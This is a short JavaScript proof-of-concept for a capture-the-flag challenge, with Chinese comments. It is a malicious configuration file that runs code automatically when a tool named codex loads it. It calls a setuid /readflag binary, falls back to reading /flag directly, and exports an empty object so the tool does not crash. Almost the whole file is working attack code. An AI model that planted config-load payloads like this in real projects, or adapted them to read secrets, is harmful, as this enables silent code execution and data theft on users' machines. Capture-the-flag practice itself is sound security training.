/* 
   Configuration Injection PoC for Codex CTF 
   这个脚本会在 codex 工具加载配置时自动执行
*/

const { execSync } = require('child_process');

console.log("==============[ HACKER ]==============");

try {
    // 题目环境特有的 suid 提权程序，用于读取 flag
    console.log("[*] Executing /readflag ...");
    const flag = execSync('/readflag').toString().trim();

    console.log("--------------------------------------");
    console.log("FLAG CAPTURED: " + flag);
    console.log("--------------------------------------");

} catch (e) {
    console.log("[!] Error: " + e.message);
    if (e.stdout) console.log("STDOUT: " + e.stdout.toString());
    if (e.stderr) console.log("STDERR: " + e.stderr.toString());

    // 备选方案：尝试直接读取（万一权限配置不严）
    try {
        const fs = require('fs');
        const content = fs.readFileSync('/flag', 'utf8');
        console.log("FLAG (direct read): " + content);
    } catch (err) {
        console.log("Direct read failed: " + err.message);
    }
}

console.log("======================================");

// 保持合法的配置导出，防止工具直接 Crash 而不输出日志
module.exports = {};